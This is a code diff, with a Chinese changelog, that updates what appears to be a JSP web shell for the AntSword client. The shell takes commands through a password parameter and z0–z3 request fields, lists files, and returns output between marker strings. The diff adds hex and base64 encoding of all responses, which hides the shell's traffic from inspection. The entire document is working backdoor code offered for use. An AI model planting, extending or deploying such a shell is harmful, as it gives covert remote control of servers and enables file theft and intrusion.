@@ -24,6 +24,8 @@
 已知问题：
  1. 文件管理遇到中文文件名显示的问题
 ChangeLog:
+  v1.6
+    1. 新增 4 种解码器支持
   v1.5
     1. 修正 base64 编码器下连接数据库 characterEncoding 出错
   v1.4
@@ -50,7 +52,12 @@ ChangeLog:
     String encoder = "";       // default
     // String encoder = "base64"; //base64
     // String encoder = "hex";    //hex(推荐)
-    String cs = "UTF-8"; // 编码方式
+    String cs = "UTF-8"; // 字符编码
+    // 数据解码 4 选 1
+    String decoder = "";
+    // String decoder = "base64"; // base64 中文正常
+    // String decoder = "hex"; // hex 中文可能有问题
+    // String decoder = "hex_base64"; // hex(base64) // 中文正常
 // ################################################
 
     String EC(String s) throws Exception {
@@ -346,6 +353,26 @@ ChangeLog:
         return fileHexContext;
     }
 
+    public static String asenc(String str, String decode){
+        if(decode.equals("hex") || decode=="hex"){
+            String ret = "";
+            for (int i = 0; i < str.length(); i++) {
+                int ch = (int) str.charAt(i);
+                String s4 = Integer.toHexString(ch);
+                ret = ret + s4;
+            }
+            return ret;
+        }else if(decode.equals("base64") || decode == "base64"){
+            String sb = "";
+            sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder();
+            sb = encoder.encode(str.getBytes());
+            return sb;
+        }else if(decode.equals("hex_base64") || decode == "hex_base64"){
+            return asenc(asenc(str, "base64"), "hex");
+        }
+        return str;
+    }
+
     String decode(String str) {
         byte[] bt = null;
         try {
@@ -391,6 +418,7 @@ ChangeLog:
     response.setContentType("text/html");
     request.setCharacterEncoding(cs);
     response.setCharacterEncoding(cs);
+    StringBuffer output = new StringBuffer("");
     StringBuffer sb = new StringBuffer("");
     try {
         String funccode = EC(request.getParameter(Pwd) + "");
@@ -399,7 +427,7 @@ ChangeLog:
         String z2 = decode(EC(request.getParameter("z2") + ""), encoder);
         String z3 = decode(EC(request.getParameter("z3") + ""), encoder);
         String[] pars = { z0, z1, z2, z3};
-        sb.append("->" + "|");
+        output.append("->" + "|");
 
         if (funccode.equals("B")) {
             sb.append(FileTreeCode(pars[1]));
@@ -439,6 +467,7 @@ ChangeLog:
     } catch (Exception e) {
         sb.append("ERROR" + "://" + e.toString());
     }
-    sb.append("|" + "<-");
-    out.print(sb.toString());
+    output.append(asenc(sb.toString(), decoder));
+    output.append("|" + "<-");
+    out.print(output.toString());
 %>
